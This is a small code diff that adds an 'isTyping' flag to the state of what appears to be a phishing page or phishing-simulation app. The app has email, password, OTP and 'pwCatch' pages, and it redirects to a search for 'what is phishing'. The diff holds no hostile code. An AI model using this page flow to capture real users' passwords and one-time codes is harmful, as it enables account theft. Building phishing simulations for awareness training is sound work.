@@ -8,6 +8,7 @@ export interface AppState {
     currentPage: 'email' | 'login' | 'password' | 'verify' | 'otp' | 'error' | 'redirect' | 'pwCatch';
     errorMessage: string;
     otp: string;
+    isTyping: boolean;
   };
   config: {
     redirectUrl: string;
@@ -28,6 +29,7 @@ export const appState: AppState = {
     currentPage: 'email',
     errorMessage: '',
     otp: '',
+    isTyping: false,
   },
   config: {
     redirectUrl: 'https://www.google.com/search?q=what+is+phishing',
